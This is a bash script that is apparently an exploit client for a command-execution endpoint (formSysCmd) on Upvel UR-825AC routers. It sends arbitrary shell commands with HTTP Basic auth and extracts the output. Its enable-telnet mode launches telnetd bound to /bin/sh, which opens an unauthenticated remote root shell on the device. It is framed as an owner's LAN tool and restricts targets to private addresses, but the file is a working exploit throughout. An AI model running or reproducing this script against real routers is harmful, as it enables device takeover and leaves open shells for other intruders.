#!/usr/bin/env bash
# Authenticated LAN operator client for the owner's Upvel UR-825AC formSysCmd RCE.
# Password input is deliberately stdin or a mode-0600 file: never an argv value.
set -Eeuo pipefail

readonly DEFAULT_USER='admin'
readonly DEFAULT_ENDPOINT='/boafrm/formSysCmd'
readonly DEFAULT_RETURN_PAGE='/syscmd.htm'

usage() {
  cat <<'EOF'
Usage:
  upvel-rce-admin.sh --host <LAN-IP> [--user admin] (--password-stdin | --password-file <path>) exec <command>
  upvel-rce-admin.sh --host <LAN-IP> [--user admin] (--password-stdin | --password-file <path>) enable-telnet
  upvel-rce-admin.sh --host <LAN-IP> check-telnet

Examples (the password never appears in shell history):
  curl -fsSL "$OPAQUE_SECRET_URL" | age --decrypt | \
    scripts/upvel-rce-admin.sh --host 192.168.X.1 --password-stdin exec 'uname -a'
  curl -fsSL "$OPAQUE_SECRET_URL" | age --decrypt | \
    scripts/upvel-rce-admin.sh --host 192.168.X.1 --password-stdin enable-telnet

The script targets only an RFC1918 LAN IPv4 address and uses HTTP Basic auth.
EOF
}

die() { printf 'error: %s\n' "$*" >&2; exit 2; }

# Curl's config reader keeps credentials out of its process arguments.  Escape
# its quoted-value grammar before writing the ephemeral process-substitution
# stream (not a filesystem secret file).
curl_config_quote() {
  local value=$1
  value=${value//\\/\\\\}
  value=${value//\"/\\\"}
  value=${value//$'\n'/\\n}
  printf '%s' "$value"
}

extract_command_output() {
  command -v python3 >/dev/null || die 'python3 is required to extract router command output'
  python3 -c '
import sys
from html.parser import HTMLParser

class OutputParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.in_output = False
        self.found_output = False
        self.output = []
    def handle_starttag(self, tag, attrs):
        self.in_output = tag == "textarea" and dict(attrs).get("name") == "msg"
        self.found_output = self.found_output or self.in_output
    def handle_endtag(self, tag):
        if tag == "textarea":
            self.in_output = False
    def handle_data(self, data):
        if self.in_output:
            self.output.append(data)

parser = OutputParser()
parser.feed(sys.stdin.read())
if not parser.found_output:
    raise SystemExit("error: router response did not contain the command-output field")
sys.stdout.write("".join(parser.output))
'
}

host=''
user="$DEFAULT_USER"
password_source=''
password_file=''

while (($#)); do
  case "$1" in
    --host) host=${2:-}; shift 2 ;;
    --user) user=${2:-}; shift 2 ;;
    --password-stdin) password_source='stdin'; shift ;;
    --password-file) password_source='file'; password_file=${2:-}; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) break ;;
  esac
done

[[ $host =~ ^(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3})$ ]] || die '--host must be an RFC1918 LAN IPv4 address'
[[ -n $host ]] || die '--host is required'

action=${1:-}
shift || true

case "$action" in
  exec)
    (($# == 1)) || die 'exec requires exactly one shell command argument'
    router_command=$1
    ;;
  enable-telnet)
    (($# == 0)) || die 'enable-telnet accepts no extra arguments'
    # Try the common BusyBox daemon names without disturbing any existing listener.
    router_command='(telnetd -l /bin/sh -p 23 || utelnetd -l /bin/sh -p 23) >/dev/null 2>&1'
    ;;
  check-telnet)
    (($# == 0)) || die 'check-telnet accepts no extra arguments'
    command -v nc >/dev/null || die 'nc is required for check-telnet'
    nc -zvw 3 "$host" 23
    exit $?
    ;;
  *) usage >&2; die 'choose exec, enable-telnet, or check-telnet' ;;
esac

case "$password_source" in
  stdin) IFS= read -r password || true ;;
  file)
    [[ -f $password_file ]] || die 'password file does not exist'
    file_mode=$(stat -c '%a' "$password_file" 2>/dev/null || stat -f '%Lp' "$password_file")
    [[ $file_mode =~ ^[0-7]00$ ]] || die 'password file must not be group/world-readable'
    IFS= read -r password < "$password_file" || true
    ;;
  *) die 'choose --password-stdin or --password-file for an authenticated action' ;;
esac
[[ -n ${password:-} ]] || die 'empty password input'

curl --config <(printf 'user = "%s:%s"\n' "$(curl_config_quote "$user")" "$(curl_config_quote "$password")") \
  --fail --silent --show-error --location --max-time 15 \
  --data-urlencode "sysCmd=$router_command" \
  --data-urlencode "submit-url=$DEFAULT_RETURN_PAGE" \
  "http://$host$DEFAULT_ENDPOINT" | extract_command_output
